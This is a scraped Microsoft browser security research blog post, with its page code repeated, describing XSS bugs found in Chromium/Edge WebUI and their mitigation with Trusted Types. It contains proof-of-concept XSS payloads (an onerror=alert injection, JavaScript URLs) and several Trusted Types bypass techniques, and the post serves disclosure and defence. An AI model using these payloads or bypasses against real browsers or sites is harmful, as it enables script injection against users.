browser process, instead of using the url parameter which can be malicious. Ways to exploit XSS on WebUI As we saw in chrome://histograms, most of WebUI has the following CSP mitigation. 1 2 3 4 5 Content-Security-Policy: child-src &#39;none&#39;; object-src &#39;none&#39;; script-src chrome://resources &#39;self&#39;; frame-ancestors &#39;none&#39;; This does mitigate XSS, but there are few ways to exploit XSS even with the above CSP. Find Script Gadgets in the WebUI or one of JS files under chrome://resources. I was able to find a few Script Gadgets in some WebUI pages due to usage of Polymer 1. Since subresources such as CSS and images can be loaded using Data URL, find a bug in those parsers and compromise the WebUI process that way. Due to the nature of WebUI, some WebUI doesn‚Äôt have an address bar (e.g. chrome://print used for print preview). In those cases, you can inject a meta tag with refresh to navigate to an attacker‚Äôs site where you can have a fake login form. With the increase of new features that use WebUI in Edge such as Edge Shopping and Web Capture, the above threat seemed like an important problem to solve. One interesting aspect of WebUI is that almost all WebUI consist of static HTML, JS, and CSS files. And only few WebUI has dynamic content with user inputs when serving WebUI (e.g. chrome://blob-internals which uses net::EscapeForHTML to escape user inputs). This means the threat of XSS in WebUI is mostly the DOM-based XSS. And luckily, the Web Platform has a solution for DOM-based XSS üòä Trusted Types to the rescue! Trusted Types introduces a new type system to the Web Platform, and it can enforce dangerous sinks to only accept Trusted Types objects instead of strings. Example: 1 2 3 4 5 6 7 8 9 // Content-Security-Policy: require-trusted-types-for &#39;script&#39;; // Throws a TypeError because of a string assignment to a dangerous sink. document.body.innerHTML += &quot;&lt;b&gt;Hello &quot; + location.hash.slice(1) + &quot;&lt;/b&gt;&quot;; // Success because textContent isn&#39;t a dangerous sink. const bold = document.createElement(&quot;b&quot;); bold.textContent = &quot;Hello &quot; + location.hash.slice(1); document.body.appendChild(bold); This enforces secure coding practice, where developers are required to use one of the following options: Write code with safe DOM APIs (e.g. use createElement and appendChild instead of innerHTML). Create a Trusted Type policy where you can sanitize an input. Example: 1 2 3 4 5 6 7 8 // Content-Security-Policy: require-trusted-types-for &#39;script&#39;; const escapeHTMLPolicy = trustedTypes.createPolicy(&#39;myEscapePolicy&#39;, { createHTML: string =&gt; string.replace(/\\&lt;/g, &#39;&amp;lt;&#39;) }); // Success because input is sanitized through a Trusted Type policy document.body.innerHTML = escapeHTMLPolicy.createHTML(&#39;&lt;img src=x onerror=alert(1)&gt;&#39;); This surprisingly simple mechanism can help defeat DOM-based XSS, because we can ensure that all assignments to dangerous sinks go through sanitization. Which means as long as the sanitization in Trusted Type policies are solid, there won‚Äôt be a DOM-based XSS. Can we trust Trusted Types? When I see a security feature, the first thing I do is to test it üòä And I was able to find a few ways to bypass Trusted Types (some were known). Platform-level bypasses Blob URL When creating a Blob URL, an attacker-controlled string may be used depending on the Web application. Example: 1 2 3 4 5 let attackerControlledString = &#39;&lt;script&gt;alert(document.domain)&lt;\\/script&gt;&#39;; const html = &#39;&lt;h1&gt; Hello &#39; + attackerControlledString + &#39;!&lt;/h1&gt;&#39;; const blob = new Blob([html], {type: &#39;text/html&#39;}); const url = URL.createObjectURL(blob); location = url; // XSS While it seems like the string assignment to Blob object needs Trusted Types enforcement, it‚Äôs difficult to enforce it because: The type argument can be something safe (e.g. text/plain) or something unknown (maybe application/signed-exchange in the future?). URL.createObjectURL also accepts File object and MediaSource object. I reported this bug, but it remains unpatched at the time of writing (probably due to the complexity). Conclusion here is that we should probably change Blob URL to something safe üòä Script loading like import Non-DOM API based script loading aren‚Äôt currently enforced by Trusted Types. Example: 1 2 let attackerControlledString = &#39;/attacker.example/exploit&#39;; import(`/${attackerControlledString}.js`); // XSS While this isn‚Äôt ideal, this can be mitigated by setting CSP script-src with allow-list of origins/URLs (which WebUI does by default). Application specific bypass Cross-document vectors As the Trusted Types specification indicates, interaction of 2 documents might bypass a Trusted Types if one of them doesn‚Äôt have a Trusted Types enforced. While this sounds obvious, it‚Äôs an interesting vector because of how Trusted Types handles a JavaScript URL. When a JavaScript URL is assigned to HTMLAnchorElement.href, HTMLIFrameElement.src, etc, it results in a DOM-based XSS. However, Trusted Types doesn‚Äôt block assignments of JavaScript URL to those sinks. Instead, it blocks the navigation to a JavaScript URL if the Trusted Types is enforced in the document (just like how CSP‚Äôs script-src blocks a JavaScript URL). This means the following cross-document interaction becomes vulnerable. 1 2 3 4 5 6 7 8 9 10 11 &lt;!-- this application allows embedding iframe with any https: website and any name attribute --&gt; &lt;iframe src=&quot;/robots.txt&quot; name=&quot;new&quot;&gt;&lt;/iframe&gt; &lt;script&gt; let attackerControlledString = &#39;javascript:alert(origin)&#39;; const a = document.createElement(&#39;a&#39;); a.href = attackerControlledString; a.target = &#39;new&#39;; a.textContent = &#39;Open new window&#39;; document.body.appendChild(a); &lt;/script&gt; If the robots.txt doesn‚Äôt have Trusted Types enforced, clicking the JavaScript URL link will result in a DOM-based XSS, because the JavaScript URL will execute in the document of robots.txt iframe. This is not only an issue in Trusted Types, but it has been a known issue for a while in CSP. And Origin Policy tries to tackle this problem by serving a default policy headers for all pages in the origin. This issue can be mitigated by enforcing Trusted Types or CSP script-src on every page (which WebUI does by default). Deploying Perfect Types Given that Trusted Types only has few bypasses and most of them can be mitigated, I‚Äôve made contributions to Chromium and deployed Perfect Types to WebUI by default. Perfect Types is a Trusted Types enforcement that doesn‚Äôt allow any Trusted Type policy creation. 1 Content-Security-Policy: require-trusted-types-for &#39;script&#39;; trusted-types &#39;none&#39;; This guarantees that the page doesn‚Äôt use any dangerous sinks, and therefore the page is DOM-XSS free üòä Of course, some WebUI does require Trusted Type policy, which we have reviewed and only allowed reviewed policies via trusted-types response header. Unfortunately, many WebUI in Chromium use Polymer, which does not support Trusted Types yet. But coincidentally, the Edge Browser Experience team refactored most of the user facing WebUI in Edge using React, which supports Trusted Types. Therefore, Trusted Types is enabled on all the core WebUI in Edge (e.g. edge://settings, edge://downloads, edge://history, edge://print, etc), where I had to disable Trusted Types in Chromium due to Polymer. The Future work Some WebUI pages required Trusted Type policy because of static string assignment to dangerous sinks or use of a sanitizer. The static string assignment is especially a problem for JS libraries. For example, if a JS library wants to convert the following code to be compatible with Trusted Types without Trusted Type policy: 1 document.body.innerHTML += &#39;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;Hello World!!&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&#39;; The following is how they need to do it today: 1 2 3 4 5 6 7 8 9 const table = document.createElement(&#39;table&#39;); const tbody = document.createElement(&#39;tbody&#39;); const tr = document.createElement(&#39;tr&#39;); const td = document.createElement(&#39;td&#39;); td.textContent = &#39;Hello World!!&#39;; tr.appendChild(td); tbody.appendChild(tr); table.appendChild(tbody); document.body.appendChild(table); The conversion increases the amount of code and makes the code less readable, even though it‚Äôs definitely a safe HTML. Therefore, I believe that such a Trusted Type policy can be simplified or removed, if we can guarantee that those won‚Äôt cause an XSS. Thankfully, Sanitizer API aims to expose an ever-green XSS free sanitizer natively in the browsers. We are involved in the discussion of Sanitizer API so that it‚Äôll integrate well with Trusted Types, and hopefully reduce the necessity of Trusted Type policy creation to minimal. This will reduce both time and amount of coding required for developers, and security code audit required for new Trusted Type policy. Takeaways There were a few lessons I learned. First, while we invest a lot in fuzzing, static analysis, and other automation to scale bug findings, sometimes moving to secure coding practices like Trusted Types is the right answer. While we had to contribute to a few libraries (such as react virtualized), converting code to be compatible with Trusted Types was much better than writing a tool to detect potential XSS (which is difficult üòã). Going forward, we will need to choose a third-party library that supports Trusted Types (or we will contribute to it). And I hope that Trusted Types support for libraries/frameworks will be important for every site, as deployment of Trusted Types grows. Second, security feature support in WebKit does matter to Chromium users. Unfortunately, bugs like XSS on the SSL error page will be exploitable on iOS even after enabling Trusted Types, because WebKit doesn‚Äôt support Trusted Types. Third, understanding the pain points of converting existing code to Trusted Types was a net positive experience. I was able to get a feeling for how a developer‚Äôs day looks, and see how they strike a balance between security, code complexity, readability, and ease of conversion. Hopefully, this experience will help shape the better integration of Sanitizer API with Trusted Types. Conclusion With the help of Trusted Types, we were able to mitigate DOM-based XSS in most of Edge‚Äôs WebUI. And due to the nature of WebUI which only serves static HTML or JS files, most of Edge‚Äôs WebUI is now XSS free in Edge 90 üòä I‚Äôm excited to see what will be the next bug class in WebUI after solving XSS! If you are interested in finding bugs on WebUI, you can take a look at the list of WebUI in edge://about or in kChromeUrls. I would like to thank Koto and the rest of the Google Security team who invented Trusted Types, as well as Mike West, Demetrios, and the rest of the Chromium team who helped me contribute to Chromium.","url":"https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types/","@type":"BlogPosting","headline":"Eliminating XSS from WebUI with Trusted Types","dateModified":"2021-03-26T09:30:00-07:00","datePublished":"2021-03-26T09:30:00-07:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types/"},"@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/edgevr/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/edgevr/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/edgevr/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/edgevr/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/edgevr/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/edgevr/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/edgevr/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/edgevr/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/edgevr/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/edgevr/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/edgevr/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/edgevr/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/edgevr/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/edgevr/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/edgevr/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/edgevr/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/edgevr/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/edgevr/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/edgevr/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/edgevr/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/edgevr/assets/css/post.css"><link rel="stylesheet" href="/edgevr/assets/css/post.css"><link rel="preload" as="style" href="/edgevr/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/edgevr/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <script type="text/javascript"> (function(c,l,a,r,i,t,y){ c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)}; t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i; y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y); })(window, document, "clarity", "script", "4xpt5cebre"); </script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2020 Cotes Chung MIT Licensed --> <script src="/edgevr/assets/js/post.min.js" async></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js" async></script> <script src="/edgevr/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/edgevr/" alt="avatar"> <img src="/edgevr/assets/img/edge-logo-128x128.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/edgevr/">Microsoft Browser <b>Vulnerability Research</b></a></div><div class="site-subtitle font-italic">News from the lab</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/edgevr/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/edgevr/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/edgevr/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/edgevr/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper" style="margin-right: 9px;"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border" style="display:none;"></span> <a href="https://github.com/MicrosoftEdge" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="/edgevr/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/edgevr/"> Posts </a> </span> <span>Eliminating XSS from WebUI with Trusted Types</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Eliminating XSS from WebUI with Trusted Types</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Mar 26, 2021, 9:30 AM -0700" > Mar 26, 2021 <i class="unloaded">2021-03-26T09:30:00-07:00</i> </span> by <span class="author"> Jun Kokatsu <a href="https://twitter.com/shhnjk" title="Author's Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> </span></div><div> Updated <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2020 Cotes Chung MIT License --> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Apr 12, 2021, 2:54 PM -0700" > Apr 12, 2021 <i class="unloaded">2021-04-12T14:54:01-07:00</i> </span></div></div><div class="post-content"><p>After the <a href="https://microsoftedge.github.io/edgevr/tags/site-isolation/">research on Site Isolation</a>, it became clear that the most common problem with extensions is calling <a href="https://microsoftedge.github.io/edgevr/posts/deep-dive-into-site-isolation-part-2/#local-file-disclosure"><code class="language-plaintext highlighter-rouge">chrome.tabs.create</code></a> with a URL received from a content script message. While such a bug can be used to steal local files, it can also open up an interesting attack surface, which is the navigation to WebUI.</p><p>In this blog post, we will review a few vulnerabilities in WebUI, followed by a few Trusted Types bypasses, and finally, how we mitigated and potentially killed the XSS as a bug class in most of Edge‚Äôs WebUI with Trusted Types.</p><h1 id="what-is-webui">What is WebUI?</h1><p>‚Äú<a href="https://chromium.googlesource.com/chromium/src/+/master/docs/webui_explainer.md">WebUI</a>‚Äù is a term used to loosely describe parts of Chromium‚Äôs UI implemented with web technologies (i.e. HTML, CSS, JavaScript), such as <em>chrome://settings</em>.</p><p>Additionally, chrome: (or edge:) scheme pages have <a href="https://chromium.googlesource.com/chromium/src/+/master/docs/chrome_untrusted.md#chrome_is-too-powerful-to-process-untrustworthy-content">special privileges</a>, such as <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1124801">access to camera and mic</a> without requesting permission, even though it is hosted in a sandboxed renderer process.</p><h1 id="restrictions-on-chrome-scheme-pages">Restrictions on chrome: scheme pages</h1><p>Due to some special privileges in chrome: scheme pages, those pages have some restrictions:</p><ol><li>Normal websites can‚Äôt navigate to chrome: scheme pages.</li><li>chrome: scheme pages don‚Äôt have access to the network.</li></ol><p>Therefore, while there have been <a href="https://bugs.chromium.org/u/1224755736/hotlists/XSS-in-WebUI?can=1">several XSS vulnerabilities</a> on WebUI in the past, most of those were treated as low severity bugs.</p><p>But if a user has an extension or two installed, there is a high possibility that a <a href="https://microsoftedge.github.io/edgevr/posts/deep-dive-into-site-isolation-part-2/#what-is-a-compromised-renderer-process">compromised render</a> can navigate to WebUI (due to <code class="language-plaintext highlighter-rouge">chrome.tabs.create</code> bugs), and therefore trigger an XSS vulnerability.</p><h1 id="xsses-found-on-webui">XSSes found on WebUI:</h1><p>While reviewing the Chromium code, I was able to find the following XSS bugs on WebUI.</p><h2 id="xss-on-chromehistograms">XSS on chrome://histograms</h2><p>chrome://histograms renders list of histograms (i.e. telemetry) collected in the browser. While reviewing the JS code of chrome://histograms, I found the following code:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>function addHistograms(histograms) {
  let htmlOutput = '';
  for (const histogram of histograms) {
    htmlOutput += histogram;
  }

  // NOTE: This is generally unsafe due to XSS attacks. Make sure |htmlOutput|
  // cannot be modified by an external party.
  $('histograms').innerHTML = htmlOutput;
}
</pre></table></code></div></div><p>From the code, it‚Äôs clear that if I can somehow control the value of <code class="language-plaintext highlighter-rouge">histogram</code>, this will result in an XSS üòä And of course, the browser wants to get telemetry from everywhere, so there is a way to add a histogram from a renderer process. With a compromised renderer, an attacker can call the following C++ code in the renderer process to cause an XSS.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>enum class XSSMetrics {
  ktest = 0,
  kMaxValue = ktest,
};

LOCAL_HISTOGRAM_ENUMERATION("XSS.&lt;style&gt;*{background:red;}&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;", XSSMetrics::ktest);
</pre></table></code></div></div><p>While the script will be blocked by CSP, inline CSS is allowed in the WebUI. Which looked like the following üòä</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/edgevr/assets/img/blog_img/trusted_types/Histogram.PNG" /></p><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1073409">The bug</a> was quickly fixed by sanitizing the HTML before calling <code class="language-plaintext highlighter-rouge">innerHTML</code>. I‚Äôve also <a href="https://chromium-review.googlesource.com/c/chromium/src/+/2172698">contributed an additional fix</a> which removed the <code class="language-plaintext highlighter-rouge">innerHTML</code> usage entirely in the chrome://histograms.</p><h2 id="xss-on-ssl-error-page">XSS on SSL error page</h2><p>The SSL error page on Chromium is somewhat special. On Windows, SSL error pages are rendered on chrome-error://chromewebdata, which isn‚Äôt as privileged as chrome: scheme pages, but it does have some special methods exposed in <code class="language-plaintext highlighter-rouge">window.certificateErrorPageController</code>. However, chrome://interstitials hosts the same SSL error pages, so technically XSS on the SSL error page can have an impact on chrome: scheme pages.</p><p>While reviewing the code in SSL error page, I found the following code in one of the JS files included in the SSL error page:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>/**
 * Ensures interstitial pages on iOS aren't loaded from cache, which breaks
 * the commands due to ErrorRetryStateMachine::DidFailProvisionalNavigation
 * not getting triggered.
 */
function setupIosRefresh() {
  if (!loadTimeData.getBoolean('committed_interstitials_enabled')) {
    return;
  }
  const params = new URLSearchParams(window.location.search.substring(1));
  const failedUrl = decodeURIComponent(params.get('url') || ''); &lt;-- [1]
  const load = () =&gt; {
    window.location.replace(failedUrl); &lt;-- [2]
  };
  window.addEventListener('pageshow', function(e) {
    window.onpageshow = load;
  }, {once: true});
}

// &lt;if expr="is_ios"&gt;
document.addEventListener('DOMContentLoaded', setupIosRefresh);
// &lt;/if&gt;
</pre></table></code></div></div><p>This is an XSS, as the <code class="language-plaintext highlighter-rouge">url</code> parameter[1] can be a JavaScript URL, and navigating to that url[2] will cause an XSS. However, the vulnerable code was only exposed to Chrome for iOS (and it was behind a flag which was only enabled in beta at the time).</p><p>Interestingly, Chrome for iOS renders the SSL error page inside the origin where the SSL error occurred. This means that the XSS bug would actually lead to a UXSS, because SSL error can be triggered on any origin when an attacker is Man-in-the-Middle.</p><p>The following video shows the UXSS in action:</p><iframe width="560" height="315" src="https://www.youtube.com/embed/a-_2b7cLL_Y" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1087282">This bug</a> was fixed by navigating to a URL provided by the browser process, instead of using the <code class="language-plaintext highlighter-rouge">url</code> parameter which can be malicious.</p><h1 id="ways-to-exploit-xss-on-webui">Ways to exploit XSS on WebUI</h1><p>As we saw in chrome://histograms, most of WebUI has the following CSP mitigation.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>Content-Security-Policy:
    child-src 'none';
    object-src 'none';
    script-src chrome://resources 'self';
    frame-ancestors 'none';
</pre></table></code></div></div><p>This does mitigate XSS, but there are few ways to exploit XSS even with the above CSP.</p><ul><li>Find <a href="https://github.com/google/security-research-pocs/tree/master/script-gadgets">Script Gadgets</a> in the WebUI or one of JS files under chrome://resources.<ul><li>I was able to find a few <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1076786">Script</a> <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1076132">Gadgets</a> in some WebUI pages due to usage of <a href="https://github.com/google/security-research-pocs/blob/master/script-gadgets/repo/csp/wh/polymer_exploit.php">Polymer 1</a>.</li></ul></li><li>Since subresources such as CSS and images can be loaded using Data URL, find a bug in those parsers and <a href="https://microsoftedge.github.io/edgevr/posts/deep-dive-into-site-isolation-part-2/#what-is-a-compromised-renderer-process">compromise</a> the WebUI process that way.</li><li>Due to the nature of WebUI, some WebUI doesn‚Äôt have an address bar (e.g. chrome://print used for print preview). In those cases, you can inject a <a href="https://css-tricks.com/snippets/html/meta-refresh/">meta tag with refresh</a> to navigate to an attacker‚Äôs site where you can have a fake login form.</li></ul><p>With the increase of new features that use WebUI in Edge such as <a href="https://www.microsoft.com/en-us/edge/shopping">Edge Shopping</a> and <a href="https://techcommunity.microsoft.com/t5/articles/introducing-web-capture-for-microsoft-edge/m-p/1721318">Web Capture</a>, the above threat seemed like an important problem to solve.</p><p>One interesting aspect of WebUI is that almost all WebUI consist of static HTML, JS, and CSS files. And only few WebUI has dynamic content with user inputs when serving WebUI (e.g. chrome://blob-internals which uses <a href="https://source.chromium.org/chromium/chromium/src/+/master:net/base/escape.cc;l=189;drc=4aa966b22d5d01458c8e8f80a812c7533f62a0b6">net::EscapeForHTML</a> to escape user inputs).</p><p>This means the threat of XSS in WebUI is mostly the <a href="https://portswigger.net/web-security/cross-site-scripting#dom-based-cross-site-scripting">DOM-based XSS</a>. And luckily, the Web Platform has a solution for DOM-based XSS üòä</p><h1 id="trusted-types-to-the-rescue">Trusted Types to the rescue!</h1><p><a href="https://web.dev/trusted-types/">Trusted Types</a> introduces a new type system to the Web Platform, and it can enforce dangerous sinks to only accept Trusted Types objects instead of strings.</p><p>Example:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>// Content-Security-Policy: require-trusted-types-for 'script';

// Throws a TypeError because of a string assignment to a dangerous sink.
document.body.innerHTML += "&lt;b&gt;Hello " + location.hash.slice(1) + "&lt;/b&gt;"; 

// Success because textContent isn't a dangerous sink.
const bold = document.createElement("b");
bold.textContent = "Hello " + location.hash.slice(1);
document.body.appendChild(bold);
